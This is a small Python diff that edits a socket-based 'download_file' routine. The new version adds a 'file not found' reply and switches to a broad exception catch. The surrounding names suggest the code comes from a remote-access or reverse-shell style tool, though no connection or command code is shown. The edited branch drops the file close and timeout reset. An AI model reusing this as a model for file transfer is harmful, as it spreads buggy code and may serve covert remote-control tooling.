@@ -567,17 +567,20 @@ def reliable_recv():
             continue
 
 def download_file(file_name):
-        f = open(file_name, 'wb')
-        s.settimeout(1)
-        chunk = s.recv(1024)
+
+    f = open(file_name, 'wb')
+    s.settimeout(1)
+    chunk = s.recv(1024)
+    if chunk.decode() == "fnfound":
+        s.send("[-] file not found".encode())
+        s.settimeout(None)
+    else:
         while chunk:
             f.write(chunk)
             try:
                 chunk = s.recv(1024)
-            except socket.timeout as e:
+            except Exception as e:
                 break
-        s.settimeout(None)
-        f.close()
 
 
 
